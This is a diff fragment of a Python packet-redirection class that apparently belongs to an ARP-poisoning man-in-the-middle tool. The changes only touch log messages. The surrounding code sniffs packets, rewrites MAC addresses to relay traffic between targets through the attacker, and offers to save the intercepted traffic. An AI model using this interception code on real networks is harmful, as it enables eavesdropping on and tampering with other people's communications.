@@ -20,7 +20,7 @@ class TrafficRedirect():
                     receiver = pkt[IP].dst
                     for i in range(len(target2)):
                         if receiver == target2[i]:
-                            print("Redirecting traffic from {} to {} ".format(pkt[IP].src, pkt[IP].dst))
+                            print("Redirecting traffic from {} to {} .".format(pkt[IP].src, pkt[IP].dst))
                             sniffed_packets.append(pkt)
                             # we are the source now cause target 2 thinks we are target 1
                             pkt[Ether].src = pkt[Ether].dst
@@ -37,7 +37,7 @@ class TrafficRedirect():
                     receiver = pkt[IP].dst
                     for i in range(len(target1)):
                         if receiver == target1[i]:
-                            print("Redirecting traffic from {} to {} ".format(pkt[IP].src, pkt[IP].dst))
+                            print("Redirecting traffic from {} to {} .".format(pkt[IP].src, pkt[IP].dst))
                             sniffed_packets.append(pkt)
                             pkt[Ether].src = pkt[Ether].dst
                             pkt[Ether].dst = target1MAC[i]
@@ -55,7 +55,7 @@ class TrafficRedirect():
                     receiver = pkt[IP].dst
                     for i in range(len(target2)):
                         if receiver == target2[i]:
-                            print("Redirecting traffic from {} to {} ".format(pkt[IP].src, pkt[IP].dst))
+                            print("Redirecting traffic from {} to {} .".format(pkt[IP].src, pkt[IP].dst))
                             sniffed_packets.append(pkt)
                             # set the mac of the true receiver (someone from list target2)
                             pkt[Ether].dst = target2MAC[i]
@@ -70,6 +70,7 @@ class TrafficRedirect():
         else:
             while not stop_event.is_set():
                 sniff(count=1, store=0, prn=lambda pkt: makeFakePacket(pkt, target1, target2, target1MAC, target2MAC, self.interface), iface=self.interface)
+        print("Traffic redirect is stopped.")
         toPrint = raw_input("Do you want to store the traffic caught during poisoning? Type 'yes' or 'no': ")
         if toPrint != "no":
             txtName = raw_input("Enter the name of the file which will contain the traffic: ")
